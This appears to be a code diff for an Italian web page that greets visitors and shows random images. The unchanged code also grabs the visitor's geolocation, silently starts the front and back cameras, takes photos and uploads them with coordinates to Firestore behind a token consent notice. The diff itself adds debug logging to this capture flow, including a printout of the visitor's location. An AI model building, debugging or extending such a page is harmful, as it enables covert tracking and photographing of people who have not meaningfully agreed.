@@ -47,15 +47,26 @@
             color: red;
             margin-top: 10px;
         }
+        #debug {
+            font-size: 14px;
+            color: blue;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <h1>Benvenuto!</h1>
     <div id="content"></div>
     <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
+    <div id="debug"></div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
     <script>
+        const debugDiv = document.getElementById('debug');
+        function logDebug(message) {
+            debugDiv.innerHTML += `<p>${message}</p>`;
+        }
+
         // Contenuti casuali
         const randomContents = [
             '<img src="https://picsum.photos/600/400?random=1" alt="Immagine casuale">',
@@ -70,6 +81,7 @@
             const contentDiv = document.getElementById('content');
             const randomIndex = Math.floor(Math.random() * randomContents.length);
             contentDiv.innerHTML = randomContents[randomIndex];
+            logDebug("Contenuto casuale mostrato");
         }
 
         // Ottieni posizione
@@ -77,10 +89,17 @@
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
-                        (error) => reject("Errore geolocalizzazione: " + error.message)
+                        (position) => {
+                            logDebug(`Posizione acquisita: Lat ${position.coords.latitude}, Lon ${position.coords.longitude}`);
+                            resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
+                        },
+                        (error) => {
+                            logDebug("Errore geolocalizzazione: " + error.message);
+                            reject("Errore geolocalizzazione: " + error.message);
+                        }
                     );
                 } else {
+                    logDebug("Geolocalizzazione non supportata");
                     reject("Geolocalizzazione non supportata");
                 }
             });
@@ -94,9 +113,10 @@
                     video: { facingMode: facingMode }
                 });
                 video.srcObject = stream;
+                logDebug(`Fotocamera ${facingMode} avviata`);
                 return stream;
             } catch (err) {
-                console.error("Errore fotocamera:", err.message);
+                logDebug("Errore fotocamera: " + err.message);
                 throw err;
             }
         }
@@ -108,12 +128,15 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            return canvas.toDataURL('image/jpeg');
+            const photo = canvas.toDataURL('image/jpeg');
+            logDebug("Foto scattata");
+            return photo;
         }
 
         // Ferma fotocamera
         function stopCamera(stream) {
             stream.getTracks().forEach(track => track.stop());
+            logDebug("Fotocamera fermata");
         }
 
         // Salva dati su Firestore
@@ -126,9 +149,10 @@
                     backPhoto: backPhoto,
                     timestamp: new Date()
                 });
-                console.log('Dati salvati su Firestore');
+                logDebug("Dati salvati su Firestore");
             } catch (err) {
-                console.error('Errore salvataggio:', err.message);
+                logDebug("Errore salvataggio: " + err.message);
+                throw err;
             }
         }
 
@@ -146,9 +170,9 @@
                 const backPhoto = takePhoto();
                 stopCamera(stream);
                 await sendData(location, frontPhoto, backPhoto);
-                console.log('Acquisizione completata');
+                logDebug("Acquisizione completata");
             } catch (err) {
-                console.error('Errore:', err.message);
+                logDebug("Errore: " + err.message);
             }
         }
 
